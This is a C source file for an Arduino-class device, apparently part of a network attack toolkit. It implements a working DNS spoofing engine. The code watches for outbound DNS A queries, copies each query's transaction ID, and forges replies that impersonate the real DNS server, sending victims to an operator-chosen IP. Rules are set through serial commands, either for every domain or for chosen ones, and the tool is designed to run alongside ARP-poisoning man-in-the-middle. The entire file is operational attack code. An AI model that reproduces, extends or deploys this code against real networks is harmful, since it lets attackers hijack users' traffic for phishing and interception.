// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "attack_dns_spoof.h"

#include <string.h>

#include <Arduino.h>

#include "config.h"
#include "dns_util.h"
#include "eth_frame.h"
#include "ids.h"
#include "inject.h"
#include "ip_util.h"
#include "state.h"

DnsSpoofRule dnsSpoofRules[DNSSPOOF_MAX_RULES];
bool         dnsSpoofEnabled = false;
uint32_t     dnsSpoofTotal   = 0;  // total spoofed responses

// ══════════════════════════════════════════════════════════════
//  DNS Spoofing Engine
// ══════════════════════════════════════════════════════════════
// Intercepts DNS queries on the wire and races the real DNS server
// by sending a forged response with our chosen IP address.
// Works best when combined with MitM (ARP poisoning) so we can
// see the victim's DNS queries and respond before the real server.

void dnsSpoofInitRules() {
  memset(dnsSpoofRules, 0, sizeof(dnsSpoofRules));
  dnsSpoofEnabled = false;
  dnsSpoofTotal = 0;
}

// ── Extract domain name from DNS wire format into dotted string ──
// DNS names are encoded as length-prefixed labels: \x03www\x06google\x03com\x00
// Returns length of the qname section in the packet (including final \x00).

// ── Get the raw qname bytes and length from a DNS query ──
// Returns pointer to qname start and sets qnameLen to include the trailing \x00.
static const uint8_t* dnsGetQname(const uint8_t* dns, uint16_t dnsLen, uint16_t* qnameLen) {
  // Questions start at offset 12 (after DNS header)
  if (dnsLen < 13)
    return NULL;

  const uint8_t* qname = dns + 12;
  uint16_t pos = 12;

  while (pos < dnsLen) {
    uint8_t labelLen = dns[pos];
    if (labelLen == 0) {
      *qnameLen = (pos + 1) - 12;
      return qname;
    }
    if ((labelLen & 0xC0) == 0xC0) {
      // Compression in question section is unusual but handle it
      *qnameLen = (pos + 2) - 12;
      return qname;
    }
    pos += 1 + labelLen;
  }

  return NULL;
}

// ── Case-insensitive domain match ──
// rule can be "*" (match all) or a domain like "example.com"
// which also matches "sub.example.com" (suffix match)
bool dnsSpoofMatchDomain(const char* decoded, const char* rule) {
  if (rule[0] == '*' && rule[1] == '\0')
    return true;

  // Case-insensitive comparison
  uint16_t decodedLen = strlen(decoded);
  uint16_t ruleLen = strlen(rule);

  if (decodedLen == 0 || ruleLen == 0)
    return false;

  // Exact match
  if (decodedLen == ruleLen) {
    for (uint16_t i = 0; i < decodedLen; i++) {
      char a = decoded[i];
      char b = rule[i];
      if (a >= 'A' && a <= 'Z')
        a += 32;
      if (b >= 'A' && b <= 'Z')
        b += 32;
      if (a != b)
        return false;
    }
    return true;
  }

  // Suffix match: decoded ends with ".rule" or equals rule
  if (decodedLen > ruleLen) {
    // Check if decoded ends with ".rule"
    if (decoded[decodedLen - ruleLen - 1] != '.')
      return false;
    const char* suffix = decoded + decodedLen - ruleLen;
    for (uint16_t i = 0; i < ruleLen; i++) {
      char a = suffix[i];
      char b = rule[i];
      if (a >= 'A' && a <= 'Z')
        a += 32;
      if (b >= 'A' && b <= 'Z')
        b += 32;
      if (a != b)
        return false;
    }
    return true;
  }

  return false;
}

// ── UDP checksum calculator ──
static uint16_t udpChecksum(const uint8_t* srcIP, const uint8_t* dstIP, const uint8_t* udpPkt,
                            uint16_t udpLen) {
  uint32_t sum = 0;

  // Pseudo-header
  for (int i = 0; i < 4; i += 2)
    sum += ((uint16_t)srcIP[i] << 8) | srcIP[i + 1];
  for (int i = 0; i < 4; i += 2)
    sum += ((uint16_t)dstIP[i] << 8) | dstIP[i + 1];
  sum += (uint16_t)IP_PROTO_UDP;
  sum += udpLen;

  // UDP packet
  for (uint16_t i = 0; i < udpLen - 1; i += 2)
    sum += ((uint16_t)udpPkt[i] << 8) | udpPkt[i + 1];
  if (udpLen & 1)
    sum += (uint16_t)udpPkt[udpLen - 1] << 8;

  while (sum >> 16)
    sum = (sum & 0xFFFF) + (sum >> 16);

  uint16_t result = ~sum & 0xFFFF;
  return (result == 0) ? 0xFFFF : result;  // UDP checksum 0 means "no checksum"
}

// ── Build and send a spoofed DNS response ──
void dnsSpoofSendResponse(const uint8_t* pkt, uint16_t len, const uint8_t* ipHdr, uint8_t ipHdrLen,
                          const uint8_t* spoofIP) {
  const uint8_t* udpHdr = ipHdr + ipHdrLen;
  const uint8_t* dns = udpHdr + 8;
  uint16_t udpLen = pktRead16(udpHdr + 4);
  uint16_t dnsLen = udpLen - 8;

  // Get TXID from original query
  uint16_t txid = pktRead16(dns);

  // Get qname from query
  uint16_t qnameLen = 0;
  const uint8_t* qname = dnsGetQname(dns, dnsLen, &qnameLen);
  if (!qname || qnameLen == 0 || qnameLen > 255)
    return;

  // Original query's source/dest for response routing
  const uint8_t* querySrcIP = ipHdr + 12;  // client IP
  const uint8_t* querySrcMAC = pkt + ETH_SRC_MAC;
  uint16_t clientPort = pktRead16(udpHdr);
  const uint8_t* queryDstIP = ipHdr + 16;  // DNS server IP (we impersonate this)

  // Build response packet in txBuf
  uint16_t pos = 0;

  // Ethernet header: send TO the client, FROM us (or from DNS server MAC if we know it)
  pos = buildEthHeader(txBuf, querySrcMAC, ETHERTYPE_IPV4);

  // DNS response payload:
  // Header(12) + Question(qnameLen + 4) + Answer(qnameLen + 4 + 2 + 2 + 4 + 2 + 4)
  // Answer uses pointer compression: 2 + 2 + 2 + 4 + 2 + 4 = 16 bytes
  uint16_t dnsRespLen = 12 + qnameLen + 4 + 12 + 4;  // using compression pointer for answer name
  uint16_t udpRespLen = 8 + dnsRespLen;

  // IPv4 header: spoof source as the DNS server the client queried
  pos += buildIPv4Header(txBuf + pos, queryDstIP, querySrcIP, IP_PROTO_UDP, udpRespLen);

  // UDP header
  uint16_t udpStart = pos;
  pktWrite16(txBuf + pos, 53);
  pos += 2;  // Source port (DNS)
  pktWrite16(txBuf + pos, clientPort);
  pos += 2;  // Dest port (client's src port)
  pktWrite16(txBuf + pos, udpRespLen);
  pos += 2;  // UDP length
  pktWrite16(txBuf + pos, 0);
  pos += 2;  // Checksum (fill later)

  // DNS header
  pktWrite16(txBuf + pos, txid);
  pos += 2;  // Transaction ID (match query)
  pktWrite16(txBuf + pos, 0x8180);
  pos += 2;  // Flags: Response, RD, RA, No Error
  pktWrite16(txBuf + pos, 1);
  pos += 2;  // Questions: 1
  pktWrite16(txBuf + pos, 1);
  pos += 2;  // Answers: 1
  pktWrite16(txBuf + pos, 0);
  pos += 2;  // Authority: 0
  pktWrite16(txBuf + pos, 0);
  pos += 2;  // Additional: 0

  // Question section (copy from original query)
  memcpy(txBuf + pos, qname, qnameLen);
  pos += qnameLen;
  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;  // Type: A
  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;  // Class: IN

  // Answer section (using name pointer compression: 0xC00C points to offset 12 in DNS)
  pktWrite16(txBuf + pos, 0xC00C);
  pos += 2;  // Name: pointer to question
  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;  // Type: A
  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;  // Class: IN
  pktWrite32(txBuf + pos, 60);
  pos += 4;  // TTL: 60 seconds
  pktWrite16(txBuf + pos, 4);
  pos += 2;  // RDLENGTH: 4 bytes (IPv4)
  memcpy(txBuf + pos, spoofIP, 4);
  pos += 4;  // RDATA: spoofed IP address

  // Calculate UDP checksum
  uint16_t cksum = udpChecksum(queryDstIP, querySrcIP, txBuf + udpStart, udpRespLen);
  pktWrite16(txBuf + udpStart + 6, cksum);

  sendRawFrame(txBuf, pos);
  dnsSpoofTotal++;
}

// ── Check if a packet is a DNS query we should spoof ──
void dnsSpoofCheck(const uint8_t* pkt, uint16_t len) {
  if (len < ETH_HEADER_LEN + 20)
    return;

  uint16_t etype = pktRead16(pkt + ETH_TYPE);
  if (etype != ETHERTYPE_IPV4)
    return;

  const uint8_t* ipHdr = pkt + ETH_HEADER_LEN;
  uint8_t ipHdrLen = (ipHdr[0] & 0x0F) * 4;
  uint8_t proto = ipHdr[9];
  if (proto != IP_PROTO_UDP)
    return;

  if (len < ETH_HEADER_LEN + ipHdrLen + 8)
    return;
  const uint8_t* udpHdr = ipHdr + ipHdrLen;
  uint16_t dstPort = pktRead16(udpHdr + 2);
  if (dstPort != 53)
    return;  // only intercept outbound DNS queries

  uint16_t udpLen = pktRead16(udpHdr + 4);
  if (udpLen < 8 + 12)
    return;  // need UDP header + DNS header

  const uint8_t* dns = udpHdr + 8;
  uint16_t dnsLen = udpLen - 8;

  // Must be a query (QR=0)
  if (dns[2] & 0x80)
    return;

  // Must have at least 1 question
  uint16_t qdcount = pktRead16(dns + 4);
  if (qdcount == 0)
    return;

  // Ignore queries from ourselves
  const uint8_t* srcIP = ipHdr + 12;
  if (memcmp(srcIP, ourIP, 4) == 0)
    return;
  if (memcmp(pkt + ETH_SRC_MAC, mac, 6) == 0)
    return;

  // Decode the domain name
  char domain[128];
  dnsDecodeName(dns, dnsLen, 12, domain, sizeof(domain));

  if (domain[0] == '\0')
    return;

  // Get qtype — must be A record (type 1) to spoof with an IPv4 address
  uint16_t qnameLen = 0;
  const uint8_t* qname = dnsGetQname(dns, dnsLen, &qnameLen);
  if (!qname)
    return;
  uint16_t qtypeOffset = 12 + qnameLen;
  if (qtypeOffset + 4 > dnsLen)
    return;
  uint16_t qtype = pktRead16(dns + qtypeOffset);
  if (qtype != 1)
    return;  // Only spoof A queries

  // Check against rules
  for (int i = 0; i < DNSSPOOF_MAX_RULES; i++) {
    if (!dnsSpoofRules[i].active)
      continue;

    if (dnsSpoofMatchDomain(domain, dnsSpoofRules[i].domain)) {
      // Match! Send spoofed response
      dnsSpoofRules[i].hitCount++;

      Serial.printf("[DNSSPOOF] %s -> %u.%u.%u.%u (from %u.%u.%u.%u)\n", domain,
                    dnsSpoofRules[i].spoofIP[0], dnsSpoofRules[i].spoofIP[1],
                    dnsSpoofRules[i].spoofIP[2], dnsSpoofRules[i].spoofIP[3], srcIP[0], srcIP[1],
                    srcIP[2], srcIP[3]);

      dnsSpoofSendResponse(pkt, len, ipHdr, ipHdrLen, dnsSpoofRules[i].spoofIP);
      return;
    }
  }
}

// ── DNS Spoof Command Parser ──
void parseDnsSpoofCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "start", 5) == 0) {
    cmd += 5;
    while (*cmd == ' ')
      cmd++;

    if (*cmd == '\0') {
      Serial.println("[DNSSPOOF] Usage: dnsspoof start X.X.X.X");
      Serial.println("  Spoofs ALL DNS A queries to respond with that IP.");
      return;
    }

    uint8_t ip[4];
    if (!parseIP(cmd, ip)) {
      Serial.println("[DNSSPOOF] Invalid IP.");
      return;
    }

    // Clear existing rules and add a wildcard
    dnsSpoofInitRules();
    dnsSpoofRules[0].active = true;
    strcpy(dnsSpoofRules[0].domain, "*");
    memcpy(dnsSpoofRules[0].spoofIP, ip, 4);
    dnsSpoofRules[0].hitCount = 0;
    dnsSpoofEnabled = true;

    Serial.printf("[DNSSPOOF] ACTIVE — all DNS -> %u.%u.%u.%u\n", ip[0], ip[1], ip[2], ip[3]);
    Serial.println("[DNSSPOOF] Works best with 'mitm start' to intercept queries");
  } else if (strncmp(cmd, "add", 3) == 0) {
    cmd += 3;
    while (*cmd == ' ')
      cmd++;

    // Parse: domain IP
    const char* space = strchr(cmd, ' ');
    if (!space) {
      Serial.println("[DNSSPOOF] Usage: dnsspoof add example.com X.X.X.X");
      return;
    }

    int domainLen = space - cmd;
    if (domainLen <= 0 || domainLen >= DNSSPOOF_MAX_DOMAIN) {
      Serial.println("[DNSSPOOF] Domain name too long.");
      return;
    }

    char domain[DNSSPOOF_MAX_DOMAIN];
    memcpy(domain, cmd, domainLen);
    domain[domainLen] = '\0';

    const char* ipStr = space + 1;
    while (*ipStr == ' ')
      ipStr++;

    uint8_t ip[4];
    if (!parseIP(ipStr, ip)) {
      Serial.println("[DNSSPOOF] Invalid IP.");
      return;
    }

    // Find free slot
    int slot = -1;
    for (int i = 0; i < DNSSPOOF_MAX_RULES; i++) {
      if (!dnsSpoofRules[i].active) {
        slot = i;
        break;
      }
    }
    if (slot < 0) {
      Serial.println("[DNSSPOOF] Rule table full (max 8). Remove one first.");
      return;
    }

    dnsSpoofRules[slot].active = true;
    strncpy(dnsSpoofRules[slot].domain, domain, DNSSPOOF_MAX_DOMAIN - 1);
    dnsSpoofRules[slot].domain[DNSSPOOF_MAX_DOMAIN - 1] = '\0';
    memcpy(dnsSpoofRules[slot].spoofIP, ip, 4);
    dnsSpoofRules[slot].hitCount = 0;
    dnsSpoofEnabled = true;

    Serial.printf("[DNSSPOOF] Rule added: %s -> %u.%u.%u.%u\n", domain, ip[0], ip[1], ip[2], ip[3]);
  } else if (strncmp(cmd, "remove", 6) == 0 || strncmp(cmd, "del", 3) == 0) {
    cmd += (cmd[0] == 'r') ? 6 : 3;
    while (*cmd == ' ')
      cmd++;

    if (*cmd == '\0') {
      Serial.println("[DNSSPOOF] Usage: dnsspoof remove example.com");
      return;
    }

    bool found = false;
    for (int i = 0; i < DNSSPOOF_MAX_RULES; i++) {
      if (!dnsSpoofRules[i].active)
        continue;
      if (dnsSpoofMatchDomain(cmd, dnsSpoofRules[i].domain) ||
          dnsSpoofMatchDomain(dnsSpoofRules[i].domain, cmd)) {
        Serial.printf("[DNSSPOOF] Removed: %s\n", dnsSpoofRules[i].domain);
        dnsSpoofRules[i].active = false;
        found = true;
      }
    }
    if (!found)
      Serial.println("[DNSSPOOF] No matching rule found.");

    // Check if any rules remain
    dnsSpoofEnabled = false;
    for (int i = 0; i < DNSSPOOF_MAX_RULES; i++) {
      if (dnsSpoofRules[i].active) {
        dnsSpoofEnabled = true;
        break;
      }
    }
    if (!dnsSpoofEnabled)
      Serial.println("[DNSSPOOF] No rules left — disabled.");
  } else if (strncmp(cmd, "stop", 4) == 0) {
    dnsSpoofEnabled = false;
    Serial.printf("[DNSSPOOF] Disabled. %u total responses spoofed.\n", dnsSpoofTotal);
  } else if (strncmp(cmd, "list", 4) == 0 || *cmd == '\0') {
    Serial.printf("[DNSSPOOF] Status: %s  |  Total spoofed: %u\n",
                  dnsSpoofEnabled ? "ACTIVE" : "disabled", dnsSpoofTotal);

    bool hasRules = false;
    for (int i = 0; i < DNSSPOOF_MAX_RULES; i++) {
      if (!dnsSpoofRules[i].active)
        continue;
      hasRules = true;
      Serial.printf("  [%d] %s -> %u.%u.%u.%u  (hits: %u)\n", i, dnsSpoofRules[i].domain,
                    dnsSpoofRules[i].spoofIP[0], dnsSpoofRules[i].spoofIP[1],
                    dnsSpoofRules[i].spoofIP[2], dnsSpoofRules[i].spoofIP[3],
                    dnsSpoofRules[i].hitCount);
    }
    if (!hasRules) {
      Serial.println("  (no rules configured)");
      Serial.println();
      Serial.println("[DNSSPOOF] Commands:");
      Serial.println("  dnsspoof start X.X.X.X        - spoof ALL queries to IP");
      Serial.println("  dnsspoof add domain X.X.X.X   - spoof specific domain");
      Serial.println("  dnsspoof remove domain         - remove a rule");
      Serial.println("  dnsspoof stop                  - disable spoofing");
      Serial.println("  dnsspoof list                  - show rules & stats");
    }
  } else {
    Serial.println("[DNSSPOOF] Commands:");
    Serial.println("  dnsspoof start X.X.X.X        - spoof ALL queries to IP");
    Serial.println("  dnsspoof add domain X.X.X.X   - spoof specific domain");
    Serial.println("  dnsspoof remove domain         - remove a rule");
    Serial.println("  dnsspoof stop                  - disable spoofing");
    Serial.println("  dnsspoof list                  - show rules & stats");
  }
}
